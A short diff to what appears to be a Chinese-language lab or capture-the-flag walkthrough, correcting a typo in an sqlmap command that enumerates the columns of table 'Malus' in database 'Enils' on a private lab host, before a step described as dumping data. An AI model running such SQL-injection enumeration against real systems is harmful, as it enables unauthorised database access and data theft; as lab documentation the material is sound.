@@ -202,7 +202,7 @@ sudo sqlmap -u "http://10.10.10.15/login" -D Enils --tables --level 3 --batch
 探测 volumns。
 
 ```bash
-sudo sqlmap -u "http://10.10.10.15/login" -D Enils -T Malus --volumns --level 3 --batch
+sudo sqlmap -u "http://10.10.10.15/login" -D Enils -T Malus --columns --level 3 --batch
 ```
 
 爆破数据。
